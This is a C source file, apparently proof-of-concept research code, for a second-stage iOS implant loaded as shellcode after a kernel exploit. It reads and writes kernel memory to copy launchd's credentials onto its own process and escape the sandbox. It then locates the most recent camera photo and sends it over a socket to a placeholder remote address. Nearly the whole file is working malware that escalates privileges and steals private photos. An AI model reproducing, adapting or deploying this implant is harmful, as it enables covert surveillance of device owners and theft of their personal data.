
/* stage2, a basic in-memory iOS implant
 *
 * it unsandboxes itself and sends the most recently taken photo to a server
 */

/***** shellcode stuff *****/

#include <dlfcn.h>
#include <stdint.h>

// linked for us by our loader:
#define FSYM(name) \
  typeof(name)* _##name __attribute__ ((section("__TEXT,__text"))) = (void*)(0x4141414141414141);

#define DSYM(name) \
  uint64_t name __attribute__ ((section("__TEXT,__text"))) = 0x4242424242424242;

// only need one symbol linked for us, dlsym
// can just memgrep and replace the 0x4141.. with it's address
FSYM(dlsym);

// all function calls should go via this macro
// so rather than doing this:
//  printf("%s %d hello\n", foo, 123);
// do this:
//  F(printf, "%s %d hello\n", foo, 123);
#define F(name, ...) \
   ((typeof(name)*)(_dlsym(RTLD_DEFAULT, #name)))(__VA_ARGS__)

/***** end shellcode stuff *****/

struct kconf {
  uint64_t kaslr_slide;
  uint32_t kbuf_size;
  uint32_t n_text_fragments;
  uint64_t text_fragments[100]; // upper limit
};

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_traps.h>
#include <pthread.h>
#include <asl.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

kern_return_t mach_vm_read
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        vm_offset_t *data,
        mach_msg_type_number_t *dataCnt
);

kern_return_t mach_vm_read_overwrite
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        mach_vm_address_t data,
        mach_vm_size_t *outsize
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);

kern_return_t mach_vm_protect
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        boolean_t set_maximum,
        vm_prot_t new_protection
);

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

void w64(mach_port_t task, uint64_t addr, uint64_t val);
uint64_t r64(mach_port_t task, uint64_t kaddr);
uint32_t r32(mach_port_t task, uint64_t kaddr);
void* load_file(char* filename, size_t* out_size);

#define timespec_cmp(a, b, CMP)     \
( ((a)->tv_sec == (b)->tv_sec) ?    \
  ((a)->tv_nsec CMP (b)->tv_nsec) : \
  ((a)->tv_sec CMP (b)->tv_sec))

// first function in the file will be the first instructions run by stage1:
void start(mach_port_t tfp0, struct kconf* kc) {
    F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "hello from stage2!");
    
    // walk the process list and find ourselves and launchd:
    
    uint64_t kaslr_slide = r64(tfp0, kc+offsetof(struct kconf, kaslr_slide));
    pid_t our_pid = F(getpid);
    pid_t launchd_pid = 1;
    
    uint64_t our_proc = 0;
    uint64_t launchd_proc = 0;
    
    // allproc
    uint64_t proc = r64(tfp0, 0xFFFFFFF00941C940+kaslr_slide);
    
    for (int i = 0; i < 1024; i++) {
        pid_t pid = r32(tfp0, proc+0x68);
        if (pid == our_pid) {
            our_proc = proc;
        }
        if (pid == launchd_pid) {
            launchd_proc = proc;
        }
        
        if (launchd_proc && our_proc) {
            break;
        }
        
        proc = r64(tfp0, proc+0);
        
        if (proc == 0 || proc == -1) {
            F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "didn't find target processes");
            F(sleep, 1000);
        }
    }
    
    // get launchd's ucreds:
    uint64_t launchd_ucred = r64(tfp0, launchd_proc+0x100); // p_ucred
    
    // use them to unsandbox ourselves:
    w64(tfp0, our_proc+0x100, launchd_ucred);
    
    // photos are in /private/var/mobile/Media/DCIM
    
    // thumbnails are: /private/var/mobile/Media/PhotoData/Thumbnails
    
    char* dirpath = "/private/var/mobile/Media/DCIM/100APPLE";
    DIR* dp = F(opendir, dirpath);
    if (dp == NULL) {
        F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "unable to open photo directory\n");
        F(sleep, 1000);
    }
    
    char* newest_photo_path = NULL;
    struct timespec newest_timespec = {0};
    
    // find the most recently created image file:
    struct dirent* ep;
    while (ep = F(readdir, dp)) {
        F(asl_log, NULL, NULL, ASL_LEVEL_ERR, ep->d_name);
        if (!F(strstr, ep->d_name, ".HEIC")) {
            // only interested in photos taken by the camera
            continue;
        }
        char* fullpath;
        F(asprintf, &fullpath, "%s/%s", dirpath, ep->d_name);
        struct stat st;
        F(stat, fullpath, &st);
        if (timespec_cmp(&st.st_birthtimespec, &newest_timespec, >)) {
            newest_photo_path = fullpath;
            newest_timespec = st.st_birthtimespec;
        } else {
            F(free, fullpath);
        }
    }
    
    F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "newest photo: %s", newest_photo_path);
    
    // send it!
    
    int sock = F(socket, PF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = PF_INET;
    addr.sin_port = htons(1234);
    addr.sin_addr.s_addr = F(inet_addr, "999.999.999.999"); // so we can replace it easily in the shellcode
    
    int conn_err = F(connect,sock, &addr, sizeof(addr));
    if (conn_err) {
        F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "connect failed");
        F(sleep, 1000);
    }
    
    size_t photo_size = 0;
    char* photo_buf = load_file(newest_photo_path, &photo_size);

    F(write,sock, photo_buf, photo_size);
    F(close, sock);
    
    //*(volatile char*)(0x45454545454545) = 'B';
    F(sleep, 1000);
}

void* load_file(char* filename, size_t* out_size) {
  struct stat sb = {0};
  int err = F(stat, filename, &sb);
    /*
  if (err != 0) {
    perror("failed to open file");
    return NULL;
  }

  if (sb.st_size > 100000000) {
    printf("that photo is kinda big...\n");
    return NULL;
  }
*/
  FILE* f = F(fopen, filename, "r");
  /*
    if (!f) {
    perror("unable to open file\n");
    return NULL;
  }
*/
  void* buf = F(malloc, sb.st_size);
  size_t n_read = F(fread, buf, 1, sb.st_size, f);
  /*
    if (n_read != sb.st_size) {
    printf("read is short\n");
    return NULL;
  }
*/
  F(fclose,f);
  *out_size = sb.st_size;
  return buf;
}

void w64(mach_port_t task, uint64_t addr, uint64_t val) {
    F(mach_vm_write, task, (mach_vm_address_t)addr, (mach_vm_offset_t)&val, (mach_msg_type_number_t)8);
}

uint64_t r64(mach_port_t task, uint64_t addr) {
    uint64_t val = 0;
    mach_vm_size_t outsize = 0;
    F(mach_vm_read_overwrite, task, (mach_vm_address_t)addr, 8, (mach_vm_address_t)&val, &outsize);
    return val;
}

uint32_t r32(mach_port_t task, uint64_t addr) {
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    F(mach_vm_read_overwrite, task, (mach_vm_address_t)addr, 4, (mach_vm_address_t)&val, &outsize);
    return val;
}

// not the actual entrypoint, just to please the compiler...
int main() {
    start(0, 0);
    return 42;
}
